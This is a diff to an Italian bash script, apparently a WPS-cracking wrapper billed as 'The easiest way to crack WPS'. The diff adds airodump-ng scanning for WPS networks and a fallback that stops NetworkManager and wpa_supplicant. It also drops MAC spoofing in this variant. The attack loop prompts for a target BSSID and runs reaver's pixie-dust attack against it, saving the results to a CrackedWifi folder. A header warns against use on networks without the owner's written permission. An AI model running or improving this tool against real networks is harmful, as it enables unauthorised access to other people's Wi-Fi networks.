@@ -22,7 +22,11 @@
 #    E-Mail: leproide@paranoici.org
 #    PGP: https://pgp.mit.edu/pks/lookup?op=get&search=0x8FF24099181CE01E
 #
-#    NOTE: usare solo su reti di propria proprietà o con autorizzazione esplicita.
+#    NOTE: usare SOLO su reti di propria proprietà o con autorizzazione esplicita
+#          scritta del proprietario. L'accesso non autorizzato a reti altrui è
+#          un reato.
+#
+#    Variante: e-wpsnomacchange.sh -> NON cambia mai il MAC (nessun macchanger).
 
 # -------------------------------------------------------------------------------
 
@@ -49,49 +53,75 @@ done
 # macchanger è opzionale; se assente si usa fallback con ip
 HAS_MACCHANGER=0
 command -v macchanger >/dev/null 2>&1 && HAS_MACCHANGER=1
-# airmon-ng è opzionale; serve per killare i processi che bloccano il monitor
+# airmon-ng opzionale (libera l'interfaccia con un solo comando, se presente)
 HAS_AIRMON=0
 command -v airmon-ng >/dev/null 2>&1 && HAS_AIRMON=1
+# airodump-ng opzionale ma CONSIGLIATO: scanner WPS con channel hopping
+# affidabile (wash su alcuni driver, es. ath9k_htc, resta fermo su un canale).
+HAS_AIRODUMP=0
+command -v airodump-ng >/dev/null 2>&1 && HAS_AIRODUMP=1
 
 # Restituisce il MAC corrente dell'interfaccia (fallback se manca macchanger)
 current_mac() {
     ip link show "$1" 2>/dev/null | awk '/link\/ether/{print $2; exit}'
 }
 
-# Killa i processi che interferiscono col monitor (NetworkManager, wpa_supplicant...)
-# Richiede airmon-ng; opzionale, va confermato dall'utente.
+# Libera l'interfaccia dai processi che la resettano (NetworkManager/wpa_supplicant).
+# Usa airmon-ng se presente, altrimenti fallback nativo (nmcli + systemctl).
+# Opzionale, va confermato dall'utente.
 kill_interfering() {
-    [ "$HAS_AIRMON" -ne 1 ] && { c_red; echo "airmon-ng non installato, salto..."; return; }
+    local dev="$1"
     c_blue
-    echo -e "\nVuoi terminare i processi che interferiscono col monitor mode?"
-    echo "(NetworkManager/wpa_supplicant verranno fermati) [s/N]"
+    echo -e "\nVuoi liberare l'interfaccia dai processi che interferiscono col monitor?"
+    echo "(NetworkManager smette di gestirla, wpa_supplicant viene fermato) [s/N]"
     c_white
     read -r kill_ans
     case $kill_ans in
-        s|S)
-            c_green; echo "Eseguo: airmon-ng check kill..."
-            airmon-ng check kill >/dev/null 2>&1
-            sleep 1
-            ;;
-        *) c_green; echo "Salto..." ;;
+        s|S) ;;
+        *) c_green; echo "Salto..."; return ;;
     esac
+
+    if [ "$HAS_AIRMON" -eq 1 ]; then
+        c_green; echo "Eseguo: airmon-ng check kill..."
+        airmon-ng check kill >/dev/null 2>&1
+    else
+        # Fallback senza aircrack-ng (tipico Fedora)
+        if command -v nmcli >/dev/null 2>&1; then
+            c_green; echo "NetworkManager: rilascio gestione di $dev..."
+            nmcli dev set "$dev" managed no >/dev/null 2>&1
+        fi
+        c_green; echo "Fermo wpa_supplicant (causa degli SCAN-FAILED ret=-95)..."
+        systemctl stop wpa_supplicant >/dev/null 2>&1
+        pkill -f "wpa_supplicant.*$dev" >/dev/null 2>&1
+    fi
+    sleep 1
 }
 
-# Imposta la modalità monitor tramite iw (sequenza down -> type monitor -> up)
+# Imposta la modalità monitor tramite iw (down -> type monitor -> [random MAC] -> up)
+# $2 = "mac" per randomizzare anche il MAC (richiede macchanger)
 set_monitor() {
-    local dev="$1"
+    local dev="$1" do_mac="$2"
     c_green; echo "Interfaccia down..."
     ip link set "$dev" down || die "Errore: non riesco a disattivare l'adattatore di rete"
     sleep 1
     echo "Imposto modalità monitor (iw)..."
     iw dev "$dev" set type monitor || die "Errore: non riesco ad inizializzare la modalità monitor"
     sleep 1
-    echo "Interfaccia up..."
+    if [ "$do_mac" = "mac" ]; then
+        if [ "$HAS_MACCHANGER" -eq 1 ]; then
+            c_white; echo "Random MAC..."
+            macchanger -r "$dev" || die "Errore: non riesco a impostare un MAC casuale"
+            sleep 1
+        else
+            c_red; echo "macchanger non installato, salto il cambio MAC..."
+        fi
+    fi
+    c_green; echo "Interfaccia up..."
     ip link set "$dev" up || die "Errore: non riesco a riattivare l'adattatore di rete"
     sleep 1
 }
 
-# Cambia il MAC in modo casuale (richiede macchanger)
+# Cambia solo il MAC su interfaccia già in monitor (richiede macchanger)
 random_mac() {
     local dev="$1"
     if [ "$HAS_MACCHANGER" -ne 1 ]; then
@@ -110,6 +140,26 @@ random_mac() {
     sleep 1
 }
 
+# Scanner reti WPS. Preferisce airodump-ng --wps (channel hopping affidabile,
+# mostra versione WPS e stato Locked); fallback su wash -C (ignora FCS, serve
+# con gli Atheros USB). Ctrl-C per terminare lo scan.
+scan_networks() {
+    local dev="$1"
+    if [ "$HAS_AIRODUMP" -eq 1 ]; then
+        c_blue
+        echo -e "\nScan con airodump-ng --wps (Ctrl-C per fermare e scegliere il target)..."
+        c_white
+        airodump-ng --wps "$dev"
+    else
+        c_blue
+        echo -e "\nairodump-ng non trovato: uso wash -C (Ctrl-C per fermare)..."
+        echo "Nota: se la lista resta su un solo canale, installa aircrack-ng"
+        echo "      (dnf install aircrack-ng) per uno scan multicanale affidabile."
+        c_white
+        wash -i "$dev" -C
+    fi
+}
+
 # Pulisco il terminale e mostro il logo
 clear
 c_yellow
@@ -120,7 +170,7 @@ echo '  |        \ /_____/  \        / |    |    /        \'
 echo ' /_______  /           \__/\  /  |____|   /_______  /'
 echo '         \/                 \/                    \/'
 c_red
-echo -e "\n                     The easiest way to crack WPS"
+echo -e "\n			The easiest way to crack WPS"
 
 # Inizio script: elenco adattatori WiFi tramite iw (sostituisce ifconfig|grep wl)
 c_blue
@@ -139,20 +189,12 @@ clear
 
 # Controllo che non sia già in modalità monitor (iw al posto di iwconfig)
 if iw dev "$wadapter" info 2>/dev/null | grep -q "type monitor"; then
-    # Già in monitor: chiedo se cambiare MAC
-    c_green
-    echo -e "\nL'adattatore è già in modalità monitor, vuoi cambiare MAC?"
-    echo -e "\nc+enter per cambiare - enter per continuare con il MAC attuale"
-    c_white
-    read -r cambiomac
-    case $cambiomac in
-        c) random_mac "$wadapter" ;;
-        *) clear; c_green; echo -e "\nContinuiamo..." ;;
-    esac
+    # Già in monitor: questa variante non tocca il MAC, proseguo
+    c_green; echo -e "\nInterfaccia già in modalità monitor, proseguo (MAC invariato)..."
     sleep 1
 else
-    # Non in monitor: opzionale kill processi interferenti, poi attivo il monitor
-    kill_interfering
+    # Non in monitor: opzionale kill processi interferenti, poi monitor (MAC invariato)
+    kill_interfering "$wadapter"
     set_monitor "$wadapter"
 fi
 
@@ -183,14 +225,12 @@ trap int_trap INT
 # Ciclo di scansione/attacco
 while true; do
 
-    # Avvio Wash per elencare le reti WPS visibili
-    c_white
-    wash -i "$wadapter"
+    # Scan reti WPS (airodump-ng --wps oppure wash -C)
+    scan_networks "$wadapter"
 
     # Parametri per reaver, con validazione
     c_red; echo -e "\nMAC da attaccare (exit per uscire):"
     c_white; read -r bssid
-    # Uscita rapida dal prompt del MAC
     if [ "$bssid" = "exit" ]; then
         c_reset; exit 0
     fi
@@ -210,7 +250,7 @@ while true; do
         c_red
         echo -e "\nEsiste già un file legato a questa rete nella directory di lavoro..."
     else
-        # Avvio reaver
+        # Avvio reaver (-K 1 = pixie-dust)
         if reaver -i "$wadapter" -b "$bssid" -c "$chn" -K 1 -vv | tee "CrackedWifi/${bssid}"; then
             echo "Cracking completo"
         else
